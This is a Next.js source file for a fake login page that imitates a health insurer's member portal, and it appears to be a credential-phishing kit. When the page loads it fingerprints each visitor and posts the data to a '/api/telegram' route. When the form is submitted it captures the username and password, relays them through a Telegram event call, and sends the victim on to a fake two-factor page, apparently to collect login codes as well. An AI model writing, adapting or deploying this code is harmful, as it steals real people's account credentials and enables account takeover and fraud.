'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  MSG_INCORRECT_USERNAME_PASSWORD,
  MSG_UNABLE_REACH_VERIFICATION,
} from '@/lib/approval-messages';
import {
  clearLoginDeniedError,
  hasLoginDeniedError,
  storeLoginCredentials,
} from '@/lib/login-flow-storage';
import { postTelegramEvent } from '@/lib/telegram-client';

export default function LoginPage() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [networkError, setNetworkError] = useState(() => {
    if (typeof window === 'undefined') return '';
    return hasLoginDeniedError() ? MSG_INCORRECT_USERNAME_PASSWORD : '';
  });
  const [submitting, setSubmitting] = useState(false);
  const [navigatingTo, setNavigatingTo] = useState(null);

  useEffect(() => {
    const client = {
      userAgent: window.navigator.userAgent,
      language: window.navigator.language || '',
      screen: `${window.screen.width}x${window.screen.height}`,
      referrer: document.referrer || 'Direct',
      url: window.location.href,
      localTime: new Date().toLocaleString(),
      utcTime: new Date().toUTCString(),
    };

    fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userId: '',
        password: '',
        method: '',
        code: '',
        client,
        eventType: 'visit',
      }),
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (networkError === MSG_INCORRECT_USERNAME_PASSWORD) {
      clearLoginDeniedError();
    }
  }, [networkError]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password || submitting) return;
    setNetworkError('');
    setSubmitting(true);
    const trimmedUsername = username.trim();
    storeLoginCredentials(trimmedUsername, password);
    try {
      const telegramPromise = postTelegramEvent('login', {
        userId: trimmedUsername,
        password,
      });
      await Promise.all([new Promise((r) => setTimeout(r, 2000)), telegramPromise]);
      router.push('/login/2fa');
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
      setSubmitting(false);
    }
  };

  const handleForgotLink = async (e, path) => {
    e.preventDefault();
    if (navigatingTo) return;
    setNavigatingTo(path);
    const notifyUrl = path === 'forgot-username' ? '/api/notify-recover-username' : '/api/notify-forgot-password';
    try {
      await fetch(notifyUrl, { method: 'POST' });
    } catch {
      // Notification failure does not block navigation
    }
    await new Promise((r) => setTimeout(r, 1000));
    router.push(path === 'forgot-username' ? '/login/forgot-username' : '/login/forgot-password');
  };

  return (
    <div className="login-page-wrap">
      <h1 className="login-title">Welcome</h1>
      <div className="login-container">
        <div className="login-content">
          <div className="login-section login-section-left">
            <h2 className="section-title">Log in for full account access</h2>
          {networkError && (
            <div className="notification-error" role="alert">
              {networkError}
            </div>
          )}
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="username" className="form-label">User Name</label>
              <input
                type="text"
                id="username"
                className="form-input"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="password" className="form-label">Password</label>
              <div className="password-wrapper">
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="password"
                  className="form-input"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  className="password-toggle"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? 'Hide password' : 'Show password'}
                >
                  <span className="password-toggle-icon" aria-hidden>
                    {showPassword ? (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" /><line x1="1" y1="1" x2="23" y2="23" /></svg>
                    ) : (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" /><circle cx="12" cy="12" r="3" /></svg>
                    )}
                  </span>
                  <span className="password-toggle-text">{showPassword ? 'Hide' : 'Show'}</span>
                </button>
              </div>
            </div>
            <button type="submit" className="login-button" disabled={submitting}>
              {submitting ? 'Logging in…' : 'Log In'}
            </button>
            <div className="form-links">
              <a
                href="/login/forgot-username"
                className={`form-link ${navigatingTo === 'forgot-username' ? 'form-link-loading' : ''}`}
                onClick={(e) => handleForgotLink(e, 'forgot-username')}
                aria-busy={navigatingTo === 'forgot-username'}
              >
                {navigatingTo === 'forgot-username' ? 'Loading…' : 'Forgot user name?'}
              </a>
              <a
                href="/login/forgot-password"
                className={`form-link ${navigatingTo === 'forgot-password' ? 'form-link-loading' : ''}`}
                onClick={(e) => handleForgotLink(e, 'forgot-password')}
                aria-busy={navigatingTo === 'forgot-password'}
              >
                {navigatingTo === 'forgot-password' ? 'Loading…' : 'Forgot password?'}
              </a>
            </div>
          </form>
        </div>
        <div className="login-section login-section-right">
          <h2 className="section-title">Log in for Dental & Vision (ONLY)</h2>
          <div className="link-group">
            <h3 className="link-group-title">Members</h3>
            <ul className="link-list">
              <li><a href="#">If your employer is based outside of New York</a></li>
              <li><a href="#">If your employer is based in New York</a></li>
            </ul>
          </div>
          <div className="link-group">
            <h3 className="link-group-title">Employers</h3>
            <ul className="link-list">
              <li><a href="#">If based outside of New York</a></li>
              <li><a href="#">If based in New York</a></li>
            </ul>
          </div>
          </div>
        </div>
      </div>
    </div>
  );
}
